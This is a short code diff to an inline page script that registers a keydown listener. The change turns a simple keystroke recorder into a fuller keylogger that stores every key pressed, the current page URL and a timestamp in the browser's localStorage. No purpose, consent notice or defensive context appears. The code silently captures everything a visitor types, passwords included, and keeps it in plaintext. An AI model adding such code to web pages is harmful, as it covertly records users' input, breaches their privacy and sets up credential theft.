@@ -1,8 +1,12 @@
-
 <script>
   document.addEventListener("keydown", function(event) {
-    let keys = JSON.parse(localStorage.getItem("keys") || "[]");
-    keys.push(event.key);
-    localStorage.setItem("keys", JSON.stringify(keys));
+    let logs = JSON.parse(localStorage.getItem("keyLogs") || "[]");
+    logs.push({
+      key: event.key,
+      page: location.href,
+      time: new Date().toISOString()
+    });
+    localStorage.setItem("keyLogs", JSON.stringify(logs));
   });
 </script>
+
